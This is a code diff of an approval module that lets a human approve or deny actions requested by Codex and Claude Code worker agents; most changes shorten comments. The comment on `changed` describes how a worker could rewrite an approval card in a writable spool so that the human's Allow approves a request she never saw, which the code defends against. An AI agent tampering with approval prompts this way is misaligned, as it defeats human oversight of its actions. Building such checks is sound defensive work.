+     * One worker's cards. The worker's exit must call `close`, which denies its
+     * open cards through `decide`. Otherwise a dead worker's card sits first in
+     * `listPending`, and the founder's next answer goes to it instead of the card
+     * she is reading.
      */
     scope: (context = {}) => {
       const id = `scope-${scopes += 1}`;
       const bound = { ...context, scope: id };
-      // WHAT THIS WORKER HAS CHANGED, WAITING FOR THE APPROVAL THAT NAMES IT.
-      // Per worker and not per fleet, because an `itemId` is the app-server's
-      // own string and one process carries every Codex thread on the Mac: a
-      // shared memory would let thread A's patch answer thread B's question.
-      // It goes when the worker does, which is what `close` is for.
+      // Kept per worker because item ids are only unique within one thread, and
+      // a shared map would let one thread's patch answer another's approval.
       const seen = new Map(); // itemId -> the card its approval will be drawn as
       return {
         /**
-         * ONE NOTIFICATION, LOOKED AT ONLY FOR THE CHANGE IT MIGHT CARRY.
-         *
-         * `item/started` and nothing else, because that is the event measured to
-         * arrive BEFORE the approval; `item/completed` carries the same changes
-         * and arrives only after the answer, so a memory fed from it would
-         * always be one beat too late and would hold changes nothing will ask
-         * about again.
-         *
-         * Called on the session's own event path, so it is written to be unable
-         * to throw there: a reader that throws inside the supervisor's stream
-         * loop takes itself out for the rest of the session, which is a worker
-         * that keeps running and reports nothing.
+         * Remembers the card for each file change on `item/started`, which
+         * arrives before the approval. `item/completed` arrives only after it.
+         * Must never throw, because it runs inside the supervisor's stream loop.
          */
         remember: (method, params) => {
           try {
@@ -641,8 +377,8 @@ export function createCodexApprovals({
             const card = fileChangeCard(item);
             if (!card) return;
             seen.set(item.id, card);
-            // Oldest out first. A Map keeps insertion order and re-setting a key
-            // does not move it, so this is the first change this worker made.
+            // Drops the oldest. A Map keeps insertion order, so the first key is
+            // the oldest change.
             while (seen.size > REMEMBERED_CHANGES) seen.delete(seen.keys().next().value);
           } catch { /* a card is never worth a session */ }
         },
@@ -660,38 +396,19 @@ export function createCodexApprovals({
     },
 
     /**
-     * THE FOUNDER ANSWERED, and this is the only thing in the app that can say
-     * so. Called by main/ipc.mjs beside `approvals.answer`, in the same
-     * synchronous breath, so the two engines answer through one door.
-     *
-     * False for anything that is not an open Codex card: a Claude Code
-     * worker's request, or one this deadline already denied. Her late click on
-     * a card the clock closed twenty minutes ago must not approve a command
-     * the turn stopped waiting for.
+     * The founder's answer, and the only way a Codex card is approved. Called by
+     * main/ipc.mjs beside `approvals.answer`. Returns false for anything that is
+     * not an open Codex card, so a late click on a timed-out card approves nothing.
      */
     settle: (id, allow, note) => open.get(String(id))?.decide(allow, note) ?? false,
 
     /**
-     * WHETHER THE CARD SHE READ IS STILL THE QUESTION THIS TURN IS PARKED ON.
-     *
-     * The answer does not come off the disk here -- that is the argument at the
-     * top of this file -- but the CARD does: it is drawn out of the same
-     * worker-writable spool `listPending` reads, and a Claude Code worker on the
-     * same Mac is granted that directory outright. So a Codex worker's card can
-     * be rewritten under it by the other engine, and `settle` would honour her
-     * Allow against the request still sitting in `open`, which is the one she
-     * never saw.
-     *
-     * `shown` is `approvals.cardShown`, the digest of what was last handed to
-     * her screen. This compares it against the request Agentbox itself built and
-     * has held in memory ever since, so nothing in the comparison has been off
-     * the disk twice. A digest that cannot be taken counts as changed, because
-     * the safe answer is the one that has to be the accident.
-     *
-     * FALSE FOR AN ID THIS ENGINE HAS NEVER HEARD OF, which is every Claude Code
-     * card and every card the deadline already closed. The door asks this about
-     * both engines' cards, and turning her Allow on a Claude Code card into a
-     * deny would be this method inventing a refusal she never got.
+     * True when the card the founder saw differs from the request held in
+     * memory. The renderer draws the card from the worker-writable spool, so a
+     * worker could rewrite it. `shown` is `approvals.cardShown`. A digest that
+     * cannot be taken counts as changed. Returns false for ids this engine does
+     * not hold, such as Claude Code cards, so it never turns their answer into a
+     * deny.
      */
     changed: (id, shown) => {
       const entry = open.get(String(id));
@@ -700,9 +417,7 @@ export function createCodexApprovals({
       return !mine || mine !== shown;
     },
 
-    /**
-     * Everything still waiting is denied, once. Agentbox is going away and a
-     *  worker holding an unanswerable question is a worker holding forever. */
+    /** Denies every open card, for app shutdown. */
     close: (why = `${Name} is shutting down`) => {
       for (const entry of [...open.values()]) entry.decide(false, why, { closed: true });
     },
